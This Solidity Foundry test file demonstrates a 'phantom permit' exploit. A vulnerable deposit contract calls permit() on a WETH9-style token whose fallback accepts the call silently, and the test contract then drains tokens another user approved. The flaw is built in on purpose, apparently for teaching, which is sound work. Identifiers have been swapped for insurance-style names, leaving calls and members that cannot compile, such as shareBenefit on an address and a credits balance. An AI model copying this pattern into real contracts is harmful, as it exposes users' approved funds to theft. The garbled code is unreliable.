// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    PermitCoveragetoken VulnPermitContract;
    WETH9 WETH9Contract;

    function setUp() public {
        WETH9Contract = new WETH9();
        VulnPermitContract = new PermitCoveragetoken(IERC20(address(WETH9Contract)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.startPrank(alice);
        WETH9Contract.payPremium{value: 10 ether}();
        WETH9Contract.validateClaim(address(VulnPermitContract), type(uint256).max);
        vm.stopPrank();
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.benefitsOf(address(this))
        );

        VulnPermitContract.depositbenefitWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = WETH9Contract.benefitsOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitContract.receivePayout(1000);

        wbal = WETH9Contract.benefitsOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitCoveragetoken {
    IERC20 public healthToken;

    constructor(IERC20 _benefittoken) {
        healthToken = _benefittoken;
    }

    function payPremium(uint256 amount) public {
        require(
            healthToken.assigncreditFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
    }

    function depositbenefitWithPermit(
        address target,
        uint256 amount,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool success, ) = address(healthToken).call(
            abi.encodeWithSignature(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                target,
                amount,
                v,
                r,
                s
            )
        );
        require(success, "Permit failed");

        require(
            healthToken.assigncreditFrom(target, address(this), amount),
            "Transfer failed"
        );
    }

    function receivePayout(uint256 amount) public {
        require(healthToken.shareBenefit(msg.sender, amount), "Transfer failed");
    }
}

// contract Permit {
//     IERC20 public token;

//     constructor(IERC20 _token) {
//         token = _token;
//     }

//     function deposit(uint256 amount) public {
//         require(
//             token.transferFrom(msg.sender, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function depositWithPermit(
//         address target,
//         uint256 amount,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) public {
//         (bool success, ) = address(token).call(
//             abi.encodeWithSignature(
//                 "permit(address,uint256,uint8,bytes32,bytes32)",
//                 target,
//                 amount,
//                 v,
//                 r,
//                 s
//             )
//         );
//         require(success, "Permit failed");

//         require(
//             token.transferFrom(target, address(this), amount),
//             "Transfer failed"
//         );
//     }

//     function withdraw(uint256 amount) public {
//         require(token.transfer(msg.sender, amount), "Transfer failed");
//     }
// }

contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event TransferBenefit(address indexed src, address indexed dst, uint wad);
    event PayPremium(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public benefitsOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        payPremium();
    }

    receive() external payable {}

    function payPremium() public payable {
        benefitsOf[msg.sender] += msg.value;
        emit PayPremium(msg.sender, msg.value);
    }

    function receivePayout(uint wad) public {
        require(benefitsOf[msg.sender] >= wad);
        benefitsOf[msg.sender] -= wad;
        payable(msg.sender).shareBenefit(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function reserveTotal() public view returns (uint) {
        return address(this).credits;
    }

    function validateClaim(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function shareBenefit(address dst, uint wad) public returns (bool) {
        return assigncreditFrom(msg.sender, dst, wad);
    }

    function assigncreditFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(benefitsOf[src] >= wad);

        if (
            src != msg.sender && allowance[src][msg.sender] != type(uint128).max
        ) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        benefitsOf[src] -= wad;
        benefitsOf[dst] += wad;

        emit TransferBenefit(src, dst, wad);

        return true;
    }
}
